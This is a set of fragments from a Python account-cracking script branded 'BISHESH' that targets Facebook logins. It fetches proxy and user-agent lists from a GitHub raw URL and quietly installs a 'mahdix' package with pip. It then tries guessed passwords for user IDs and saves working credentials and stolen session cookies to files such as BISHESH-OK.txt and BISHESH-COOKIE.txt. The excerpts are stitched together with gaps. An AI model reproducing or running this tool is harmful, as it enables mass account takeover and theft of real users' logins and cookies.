...
# Check if 'mahdix' module is installed
try:
    import mahdix
except ImportError:
    print("mahdix module not found. Installing...")
    os.system("pip install mahdix")
    import mahdix  # Now try importing again
...
try:
  prox= requests.get('https://raw.githubusercontent.com/GodBishesh/data/main/proxies.txt').text
...
android_models=[]
try:
  xx = requests.get('https://raw.githubusercontent.com/GodBishesh/data/main/strings.txt').text.splitlines()
  for line in xx:
...
usr=[]
try:
  xd=requests.get('https://raw.githubusercontent.com/GodBishesh/data/main/ua.txt').text.splitlines()
  for us in xd:
    usr.append(us)
except: pass """
...
###################################
        ...
        q = json.loads(po)
        if 'session_key' in q:
          print('\r\r\033[1;32m [BISHESH-ALIVE] '+uid+' | '+pas+' | ['+gray(uid)+']\033[1;97m')
          open('/sdcard/BISHESH-OK.txt','a').write(ids+'|'+pas+'\n')
          oks.append(ids)
          break
        elif 'www.facebook.com' in q['error_msg']:
          if 'y' in pcp:
            print('\r\r\x1b[1;93m [CHECKPOINT] '+ids+' | '+pas+' | ['+alex(ids)+']\033[1;97m')
            open('/sdcard/BISHESH-CP.txt','a').write(ids+'|'+pas+'\n')
            cps.append(ids)
            break
          else:
            open('/sdcard/BISHESH-CP.txt','a').write(ids+'|'+pas+'\n')
...
###################################                    
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [BISHESH-ALIVE] '+uid+' | '+pas+' | ['+alex(uid)+'] |'+coki+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/BISHESH-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/BISHESH-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
###################################               
                        ...
                        if "c_user" in VEER:
                                ...
                                print(f'\r\r\x1b[1;92m [BISHESH-ALIVE] %s | %s | %s | %s'%(ids,pas,alex(ids),kuki))
                                open('/sdcard/BISHESH-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/BISHESH-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                oks.append(ids)
                                break
...
def ffb2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [BISHESH-CRACKING]  %s | ALIVE: %s | CHECKPOINT: %s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
